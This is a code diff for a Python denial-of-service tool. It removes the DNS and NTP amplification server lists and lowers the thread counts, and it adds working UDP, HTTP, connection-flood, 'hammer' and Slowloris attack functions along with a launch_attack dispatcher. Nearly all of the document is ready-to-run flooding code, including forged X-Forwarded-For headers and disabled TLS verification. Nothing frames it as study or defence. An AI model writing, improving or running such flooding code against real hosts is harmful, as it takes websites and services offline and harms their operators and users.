@@ -7,14 +7,7 @@ import ssl
 import struct
 import requests
 from urllib.parse import urlparse
-import dns.resolver
-import socks
-import cloudscraper
-from queue import Queue
-import http.client
 import urllib3
-from scapy.all import IP, TCP, UDP, ICMP, send, Raw
-import subprocess
 
 # Disable warnings for cleaner output
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -26,31 +19,11 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
 ]
 
-# Amplification servers for DNS and other amplification attacks
-DNS_AMPLIFICATION_SERVERS = [
-    "8.8.8.8", "8.8.4.4",  # Google DNS
-    "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
-    "9.9.9.9", "149.112.112.112",  # Quad9 DNS
-    "208.67.222.222", "208.67.220.220",  # OpenDNS
-    "64.6.64.6", "64.6.65.6"  # Verisign DNS
-]
-
-NTP_AMPLIFICATION_SERVERS = [
-    "time.google.com", "time.windows.com", "time.apple.com",
-    "pool.ntp.org", "0.pool.ntp.org", "1.pool.ntp.org"
-]
-
-# Thread management - increased for more power
-MAX_THREADS = 2000
+# Thread management - optimized for performance without crashing
+MAX_THREADS = 500  # Reduced to prevent system overload
 active_threads = threading.Semaphore(MAX_THREADS)
-thread_limiter = threading.BoundedSemaphore(MAX_THREADS)
 
 def resolve_target(target):
     """Resolve a target (URL or IP) to IP address and port"""
@@ -76,52 +49,34 @@ def resolve_target(target):
         raise ValueError(f"Could not resolve target: {target} - {str(e)}")
 
 def attack_udp_god(target, duration):
-    """Massive UDP flood with optimized performance"""
+    """Optimized UDP flood with better resource management"""
     ip, port = resolve_target(target)
     
-    threads_count = 1000  # Increased thread count
-    packet_size = 65500   # Maximum UDP packet size
+    threads_count = 200  # Reduced to prevent network overload
+    packet_size = 1024   # Reduced packet size
     
     def flood():
         with active_threads:
-            data = random._urandom(packet_size)
             end_time = time.time() + duration
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            
-            # Set socket options for maximum performance
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            try:
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            except:
-                pass
             
             while time.time() < end_time:
                 try:
-                    # Send multiple packets per iteration
-                    for _ in range(100):
-                        if time.time() >= end_time:
-                            break
-                        sock.sendto(data, (ip, port))
-                except socket.error:
-                    # Handle socket errors
-                    try:
-                        sock.close()
-                    except:
-                        pass
-                    # Recreate socket
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                    try:
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-                    except:
-                        pass
+                    # Use context manager to ensure socket cleanup
+                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                        sock.settimeout(1)
+                        data = random._urandom(packet_size)
+                        
+                        # Send multiple packets but with controlled rate
+                        for _ in range(50):  # Reduced packets per iteration
+                            if time.time() >= end_time:
+                                break
+                            sock.sendto(data, (ip, port))
+                            
+                        # Small delay to prevent network card overload
+                        time.sleep(0.01)
                 except Exception:
-                    time.sleep(0.01)
-            
-            try:
-                sock.close()
-            except:
-                pass
+                    # Brief pause on error to prevent rapid reconnection attempts
+                    time.sleep(0.1)
     
     # Start threads
     threads = []
@@ -135,37 +90,254 @@ def attack_udp_god(target, duration):
     time.sleep(duration)
     for t in threads:
         try:
-            t.join(timeout=0.5)
+            t.join(timeout=1.0)
         except:
             pass
 
 def attack_http_flood(target, duration):
-    """High-performance HTTP flood with connection pooling"""
+    """Optimized HTTP flood with connection pooling and better resource management"""
     ip, port = resolve_target(target)
     use_ssl = port == 443
     
-    threads_count = 800  # Increased thread count
+    threads_count = 100  # Reduced thread count
     
     # Enhanced headers and paths
     paths = [
         "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
         "/search", "/checkout", "/cart", "/product/123",
-        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts",
-        "/.env", "/config.php", "/phpinfo.php", "/adminer.php",
-        "/mysql/admin", "/phpMyAdmin", "/database", "/api/json",
-        "/autodiscover/autodiscover.xml", "/ecp/", "/owa/", "/api/"
+        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts"
     ]
     
-    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH", "CONNECT", "PROPFIND"]
-    
-    referers = [
-        "https://www.google.com/", "https://www.bing.com/", "https://yandex.com/", 
-        "https://facebook.com/", "https://twitter.com/", "https://reddit.com/",
-        "https://www.youtube.com/", "https://www.amazon.com/", "https://www.netflix.com/"
-    ]
+    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
     
     def build_request(target_host):
         method = random.choice(methods)
         path = random.choice(paths)
         
         headers = [
+            f"{method} {path} HTTP/1.1",
+            f"Host: {target_host}",
+            f"User-Agent: {random.choice(USER_AGENTS)}",
+            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            f"Accept-Language: en-US,en;q=0.5",
+            f"Accept-Encoding: gzip, deflate, br",
+            f"Cache-Control: no-cache",
+            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
+            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
+            f"Connection: keep-alive",
+            f"Upgrade-Insecure-Requests: 1",
+        ]
+        
+        if method == "POST":
+            headers.extend([
+                "Content-Type: application/x-www-form-urlencoded",
+                f"Content-Length: {random.randint(100, 500)}"
+            ])
+        
+        return "\r\n".join(headers) + "\r\n\r\n"
+    
+    def flood():
+        with active_threads:
+            end_time = time.time() + duration
+            
+            while time.time() < end_time:
+                try:
+                    # Use context manager for proper socket cleanup
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                        sock.settimeout(5)
+                        
+                        if use_ssl:
+                            context = ssl.create_default_context()
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            with context.wrap_socket(sock, server_hostname=ip) as ssock:
+                                ssock.connect((ip, port))
+                                request = build_request(ip)
+                                ssock.sendall(request.encode())
+                        else:
+                            sock.connect((ip, port))
+                            request = build_request(ip)
+                            sock.sendall(request.encode())
+                            
+                        # Small delay between requests
+                        time.sleep(0.05)
+                            
+                except Exception:
+                    # Handle errors without affecting client
+                    time.sleep(0.1)
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    # Wait for duration
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(timeout=1.0)
+        except:
+            pass
+
+def attack_tcp_syn(target, duration):
+    """TCP SYN flood with better resource management"""
+    ip, port = resolve_target(target)
+    
+    threads_count = 50  # Reduced thread count
+    
+    def syn_flood():
+        with active_threads:
+            end_time = time.time() + duration
+            
+            while time.time() < end_time:
+                try:
+                    # Use regular sockets instead of raw sockets for better compatibility
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(2)
+                    s.connect((ip, port))
+                    s.close()
+                except:
+                    # If connection fails, just continue
+                    pass
+                
+                # Small delay to prevent overwhelming the system
+                time.sleep(0.01)
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=syn_flood)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(timeout=1.0)
+        except:
+            pass
+
+def attack_hammer(target, duration):
+    """Optimized hammer attack with better resource management"""
+    ip, port = resolve_target(target)
+    
+    threads_count = 100  # Reduced thread count
+    
+    def hammer_request():
+        with active_threads:
+            end_time = time.time() + duration
+            
+            while time.time() < end_time:
+                try:
+                    # Create HTTP request
+                    headers = {
+                        'User-Agent': random.choice(USER_AGENTS),
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1',
+                        'Cache-Control': 'max-age=0',
+                    }
+                    
+                    # Use requests with timeout to prevent hanging
+                    if port == 443:
+                        url = f"https://{ip}:{port}/"
+                    else:
+                        url = f"http://{ip}:{port}/"
+                    
+                    response = requests.get(url, headers=headers, timeout=5, verify=False)
+                    
+                except Exception:
+                    # Handle any errors gracefully
+                    pass
+                
+                # Small delay between requests
+                time.sleep(0.1)
+    
+    # Start threads
+    threads = []
+    for _ in range(threads_count):
+        t = threading.Thread(target=hammer_request)
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    time.sleep(duration)
+    for t in threads:
+        try:
+            t.join(timeout=1.0)
+        except:
+            pass
+
+def attack_slowloris(target, duration):
+    """Improved Slowloris attack with better connection management"""
+    ip, port = resolve_target(target)
+    use_ssl = port == 443
+    
+    sockets_count = 100  # Reduced socket count
+    sockets = []
+    
+    # Create initial sockets
+    for _ in range(sockets_count):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            
+            if use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                s = context.wrap_socket(s, server_hostname=ip)
+            
+            s.connect((ip, port))
+            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
+            sockets.append(s)
+        except:
+            pass
+    
+    end_time = time.time() + duration
+    
+    # Keep connections alive
+    while time.time() < end_time and sockets:
+        for s in list(sockets):  # Use list copy to avoid modification during iteration
+            try:
+                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+            except:
+                try:
+                    s.close()
+                    sockets.remove(s)
+                except:
+                    pass
+        
+        # Increased interval to reduce load
+        time.sleep(15)
+    
+    # Clean up
+    for s in sockets:
+        try:
+            s.close()
+        except:
+            pass
+
+# Attack dispatcher for easy calling
+ATTACK_METHODS = {
+    "udp": attack_udp_god,
+    "http": attack_http_flood,
+    "syn": attack_tcp_syn,
+    "hammer": attack_hammer,
+    "slowloris": attack_slowloris,
+}
+
+def launch_attack(method, target, duration):
+    """Launch an attack with the specified method"""
+    if method in ATTACK_METHODS:
+        print(f"Starting {method} attack on {target} for {duration} seconds")
+        ATTACK_METHODS[method](target, duration)
+        print(f"{method} attack on {target} completed")
+    else:
+        print(f"Unknown attack method: {method}")
